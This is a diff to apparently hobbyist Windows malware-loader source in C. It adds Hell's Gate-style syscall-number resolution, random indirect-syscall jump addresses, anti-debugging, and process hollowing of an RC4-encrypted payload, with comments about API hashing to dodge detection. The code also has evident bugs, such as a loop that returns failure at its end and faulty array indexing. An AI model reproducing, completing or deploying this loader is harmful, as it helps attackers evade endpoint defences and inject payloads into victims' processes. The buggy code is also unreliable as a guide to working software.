@@ -17,8 +17,24 @@ typedef struct _VX_TABLE {
     VX_TABLE_ENTRY Read;
     VX_TABLE_ENTRY Write;
 } VX_TABLE, * PVX_TABLE;
+    
+//PVOID* pSystemCalls = NULL; //allocate PVOID * dwDLLSize memory for our array of pointers
 
+#define num_syscalls 2000
+PVOID* pSystemCalls[num_syscalls];
+VX_TABLE VxTable = { 0 };
+void initializeSystemCalls() {
+    
+    
 
+    if (pSystemCalls == NULL) {
+        printf("Mem allocation error\n");
+        exit(1);
+    }
+    printf("Address of pSystemCalls(it should all be zero'd....: 0x%p\n", pSystemCalls);
+
+    printf("Size of pSystemCalls %zu\n", num_syscalls);
+}
 // this is what SystemFunction032 function take as a parameter
 typedef struct
 {
@@ -152,8 +168,13 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
     // THis 64 is based on the architecture used...
     
     //BOOL result = syscalls.myNtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
-    BOOL result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
-
+    //BOOL result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
+    printf("Base Address: 0x%p\n", BaseAddress);
+    getchar();
+    //BOOL result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
+    BOOL result = NoahRead(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
+    printf("Proc Address: 0x%p", procAddr);
+    getchar();
     uintptr_t executableAddress = *((uintptr_t*)procAddr);//
     
     //result = syscalls.myNtReadVirtualMemory(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), &bytesRW);
@@ -525,8 +546,8 @@ BOOL GetVXTableEntry(DWORD dwDLLSize,PVOID* pSystemCalls ,PVOID pModuleBase, PIM
     WORD byteCounter = 0;
     WORD counter = 0;
     while (TRUE) {
-        if (byteCounter == dwDLLSize) {
-            break;
+        if (byteCounter == dwDLLSize || counter == num_syscalls /*testing*/) {
+            return FALSE;
             printf("End of DLL\n");
         }
         if (
@@ -534,7 +555,10 @@ BOOL GetVXTableEntry(DWORD dwDLLSize,PVOID* pSystemCalls ,PVOID pModuleBase, PIM
             ) {
             PBYTE opcode1 = *((PBYTE)pModuleBase + byteCounter);
             PBYTE opcode2 = *((PBYTE)pModuleBase + byteCounter + 1);
-            pSystemCalls[counter] = (PVOID)((PBYTE)pModuleBase + byteCounter);
+            printf("\n");
+           pSystemCalls[counter] = (PVOID)((PBYTE)pModuleBase + byteCounter);
+           PVX_TABLE *pVxTable = &VxTable;
+           printf("Syscalls Array: %p\nVxTable: %p\n", pSystemCalls, pVxTable);
             printf("0x%p\t%02x\t%02x\n", pSystemCalls[counter],opcode1, opcode2); // NICE
             
             counter++;
@@ -542,7 +566,8 @@ BOOL GetVXTableEntry(DWORD dwDLLSize,PVOID* pSystemCalls ,PVOID pModuleBase, PIM
         byteCounter = byteCounter + 1;
 
         }
-    
+
+
         //Now since we don't want to pass strings of APIs we will hash and compare hashes to pre-hashed list.
         //See the API_Hashing module example
     return TRUE;
@@ -556,8 +581,31 @@ BOOL GetVXTableEntry(DWORD dwDLLSize,PVOID* pSystemCalls ,PVOID pModuleBase, PIM
 
 
 
+WORD GetSSN(DWORD input) {
+    if (input == 0) {
+        printf("Wow! Read Syscall Getter called: %zu\n",VxTable.Read.wSystemCall);
+        return VxTable.Read.wSystemCall;
+    }
+    else if (input == 1) {
+        return VxTable.Write.wSystemCall;
+    }
+    else if (input == 2) {
+        return VxTable.Allocate.wSystemCall;
+    }
+}
+
+PVOID GetJMP() {
+    PVOID address = pSystemCalls[((DWORD)rand()) % sizeof(pSystemCalls)];
+    printf("Getting JMP! 0x%p\n", address);
+    getchar();
+    return address;
+}
+
+
+
 int main() {
 
+    initializeSystemCalls();
 
     STARTUPINFOA Si = { 0 };
     PROCESS_INFORMATION Pi = { 0 };
@@ -581,7 +629,6 @@ int main() {
     //    truePayload[i] = (BYTE)(((DWORD)buf[i] ^ 0xAA) & 0xFF);
     //}
     detectDebug();
-    //hollowProcess(Pi, sizeof(Rc4CipherText));
     //DeleteSelf();
 
 
@@ -612,10 +659,9 @@ int main() {
 
     printf("DLL Size (bytes): %d", dwDLLSize);
 
-    PVOID* pSystemCalls = (PVOID*)malloc(dwDLLSize * sizeof(PVOID)); //allocate PVOID * dwDLLSize memory for our array of pointers
 
 
-    VX_TABLE VxTable = { 0 };
+
 
     VX_TABLE_ENTRY Write = { 0 };
     VX_TABLE_ENTRY Read = { 0 };
@@ -641,11 +687,24 @@ int main() {
     //Now with the image export directory we can loop through function names and find the desired functions for syscalls!
     printf("Systemcall: Write\t ADDR: 0x%p \t Hash: %0.8X \t SSN: %d\n", VxTable.Write.pAddress, VxTable.Write.dwHash, VxTable.Write.wSystemCall);
 
+    // i wish there was a way to pass the entire struct and then loop through this
     GetVXTableEntry(dwDLLSize,&pSystemCalls,pNtdllBase, ppImageExportDirectory, &VxTable.Write);
+    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.Read);
+    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.Allocate);
+    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.Protect);
     
-    printf("Systemcall: Write\t ADDR: 0x%p \t Hash: %0.8X \t SSN: %hu\n", VxTable.Write.pAddress, VxTable.Write.dwHash, VxTable.Write.wSystemCall);
+
+    printf("Second run: Systemcall: Write\t ADDR: 0x%p \t Hash: %0.8X \t SSN: %hu\n", VxTable.Write.pAddress, VxTable.Write.dwHash, VxTable.Write.wSystemCall);
     //Now we just have to call the function using assembly temmplates!
-    
+    getchar();
+
+    //i just realised im dumb we need all the params to the syscall as well haha so its better
+    //to keep the register params empty for the syscall and then call vals within the assemnbly and use return regiser instead
+
+    //NoahSyscallTemplate(VxTable.Allocate.wSystemCall, 
+    getchar();
+    hollowProcess(Pi, sizeof(Rc4CipherText));
+
 
     getchar();
     return 0;
